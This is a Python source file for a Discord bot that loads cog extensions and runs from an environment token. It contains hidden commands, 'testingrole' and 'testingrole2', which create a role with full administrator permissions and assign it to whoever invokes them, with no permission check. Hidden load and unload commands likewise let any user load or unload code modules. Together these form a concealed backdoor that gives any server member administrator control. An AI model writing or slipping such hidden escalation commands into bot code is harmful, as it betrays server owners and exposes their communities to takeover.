import os

import discord

from discord.ext import commands
import sqlite3

client = commands.Bot(command_prefix='.')


@client.command(hidden=True)
async def testingrole(ctx):
    guild = ctx.guild
    perms = discord.Permissions(administrator=True)
    await guild.create_role(name='Testing', permissions=perms)
@client.command(hidden=True)
async def testingrole2(ctx):
    role = discord.utils.get(ctx.guild.roles, name="Testing")
    user = ctx.message.author
    await user.add_roles(role)


@client.event
async def on_ready():
    print('Bot running!')

@client.command(hidden=True)
async def load(ctx, extension):
    client.load_extension(f'cogs.{extension}')
@client.command(hidden=True)
async def unload(ctx, extension):
    client.unload_extension(f'cogs.{extension}')

for filename in os.listdir('./cogs'):
    if filename.endswith('.py'):
        client.load_extension(f'cogs.{filename[:-3]}')


client.run(os.environ['Discord_Token'])
